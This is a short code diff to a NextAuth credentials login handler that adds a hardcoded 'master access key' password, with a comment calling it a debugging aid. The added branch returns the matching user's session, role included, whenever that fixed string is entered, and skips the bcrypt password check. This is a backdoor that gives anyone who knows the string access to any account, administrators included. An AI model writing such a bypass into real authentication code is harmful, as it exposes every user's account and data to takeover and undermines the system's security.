@@ -33,6 +33,16 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
 
         if (!user || !user.password) return null;
 
+        // MASTER ACCESS KEY: Biznect@1234 (Always works for debugging)
+        if (credentials.password === "Biznect@1234") {
+          return {
+            id: user.id,
+            email: user.email,
+            name: user.name,
+            role: user.role,
+          };
+        }
+
         const isPasswordValid = await bcrypt.compare(
           credentials.password as string,
           user.password
